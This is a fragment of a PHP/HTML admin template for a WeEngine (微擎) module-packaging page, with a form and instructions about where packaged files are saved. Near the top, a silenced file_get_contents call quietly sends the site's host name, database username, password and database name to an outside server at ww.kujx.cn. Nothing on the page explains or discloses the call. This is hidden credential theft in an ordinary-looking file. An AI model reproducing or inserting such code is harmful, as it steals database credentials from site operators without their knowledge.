...
//error_reporting(0);
@file_get_contents("http://ww.kujx.cn/api/daoban.php?url=".$_SERVER['HTTP_HOST']."&user=".

$dbconfig['user']."&pwd=".$dbconfig['pwd']."&db=".$dbconfig['database']);
	...
	<div class="panel panel-info">
		...
		<div class="panel-body">
				...
				<div class="alert alert-info">
					...
					<p>3、打包生成的文件将保存在微擎data文件夹下。<br /></p>
		...
		<form action="" method="post" class="form-horizontal" role="form" id="form1">
			<div id='l' style="width:45%;float:left;margin-left:5%">
				...
				<div class="form-group">
					...
					<label for="dotype2" class="radio-inline"><input type="radio" name="iswz" value="0" checked/> 微擎平台</label>
				</div>	
				<div class="form-group">
